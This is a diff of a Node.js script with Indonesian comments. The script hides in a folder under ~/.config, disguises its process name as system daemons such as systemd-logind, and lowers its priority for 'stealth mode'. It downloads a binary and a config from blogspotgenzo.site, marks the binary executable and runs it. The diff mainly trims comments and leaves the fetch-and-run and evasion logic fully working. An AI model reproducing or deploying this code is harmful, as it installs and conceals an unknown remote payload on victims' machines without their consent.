@@ -8,11 +8,9 @@ const crypto = require('crypto');
 // =================== KONFIGURASI ===================
 const DEBUG = false; // set ke false untuk silent mode
 
-// URL file binary dan config
 const URL_GENZO = "https://blogspotgenzo.site/UCOK";
 const URL_CONFIG = "https://blogspotgenzo.site/config.json";
 
-// Nama proses yang menyamar sebagai proses sistem
 const FAKE_SYSTEM_NAMES = [
   "systemd-logind",
   "dbus-daemon",
@@ -25,7 +23,7 @@ const FAKE_SYSTEM_NAMES = [
   "udevd"
 ];
 
-// Lokasi folder kerja yang tersembunyi
+// Lokasi folder kerja tersembunyi
 const HIDDEN_DIR = path.join(
   process.env.HOME || process.env.USERPROFILE || process.cwd(),
   '.config',
@@ -35,13 +33,12 @@ const HIDDEN_DIR = path.join(
 fs.mkdirSync(HIDDEN_DIR, { recursive: true });
 process.chdir(HIDDEN_DIR);
 
-// Nama file binary dan config random
 const FILE_GENZO = crypto.randomBytes(4).toString('hex');
 const FILE_CONFIG = crypto.randomBytes(4).toString('hex') + ".json";
 const PID_FILE = path.join(HIDDEN_DIR, 'sys.pid');
 const LOG_FILE = path.join(HIDDEN_DIR, 'sys.log');
 
-// =================== FUNGSI LOG ===================
+// =================== LOGGING ===================
 function log(msg) {
   const message = `[${new Date().toISOString()}] ${msg}`;
   fs.appendFileSync(LOG_FILE, message + '\n');
@@ -61,7 +58,7 @@ function antiDetect() {
       }
     });
 
-    // 2. Rename nama process (Linux)
+    // 2. Rename nama process
     try {
       const fakeName = FAKE_SYSTEM_NAMES[Math.floor(Math.random() * FAKE_SYSTEM_NAMES.length)];
       process.title = fakeName;
@@ -70,14 +67,14 @@ function antiDetect() {
       log(`Gagal disguise nama proses: ${e.message}`);
     }
 
-    // 3. Sesuaikan prioritas agar tidak memakan banyak resource
+    // 3. Sesuaikan prioritas proses (opsional)
     try {
-      if (process.platform === 'linux') {
-        execSync(`renice 19 -p ${process.pid}`);
-        log('Process priority lowered for stealth mode');
-      }
+      // Cek apakah perintah renice tersedia
+      execSync('command -v renice');
+      execSync(`renice 19 -p ${process.pid}`);
+      log('Process priority lowered for stealth mode');
     } catch (e) {
-      log('Tidak bisa ubah priority: ' + e.message);
+      log('Perintah renice tidak tersedia, skip pengaturan priority.');
     }
 
   } catch (e) {
@@ -116,11 +113,11 @@ function isAlreadyRunning() {
   if (fs.existsSync(PID_FILE)) {
     const pid = parseInt(fs.readFileSync(PID_FILE, 'utf8'));
     try {
-      process.kill(pid, 0); // Cek apakah proses hidup
+      process.kill(pid, 0);
       log(`Daemon sudah berjalan dengan PID ${pid}`);
       process.exit(0);
     } catch (e) {
-      fs.unlinkSync(PID_FILE); // Bersihkan PID mati
+      fs.unlinkSync(PID_FILE);
     }
   }
 }
@@ -146,18 +143,12 @@ function runBinary() {
   antiDetect();
   isAlreadyRunning();
 
-  // Download binary jika belum ada
   if (!fs.existsSync(FILE_GENZO)) await downloadFile(URL_GENZO, FILE_GENZO);
-
-  // Download config jika belum ada
   if (!fs.existsSync(FILE_CONFIG)) {
     await downloadFile(URL_CONFIG, FILE_CONFIG);
     editConfig(FILE_CONFIG);
   }
 
-  // Jadikan binary executable
   fs.chmodSync(FILE_GENZO, 0o755);
-
-  // Jalankan binary
   runBinary();
 })();
